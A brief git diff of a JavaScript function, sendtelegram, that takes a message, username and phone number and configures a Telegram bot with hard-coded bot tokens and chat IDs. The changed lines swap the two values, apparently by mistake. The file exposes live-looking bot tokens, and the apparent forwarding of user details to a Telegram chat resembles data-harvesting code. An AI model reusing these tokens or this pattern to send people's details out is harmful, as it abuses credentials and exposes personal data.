@@ -7,8 +7,8 @@ function send() {
 }
 
 function sendtelegram(message, username, phone) {
-    let telegram_bot_id = "6642613706:AAEJpjuIslHdYq7kUd8z63WK7W_jqxROiEY";
-    let chat_id = 5672364704;
+    let telegram_bot_id =5672364704;
+    let chat_id = '6642613706:AAE_6uMmlqsiuRQCrPL-4-cLS_vggsNPL30' ;
     let settings = {
         "async": true,
         "crossDomain": true,
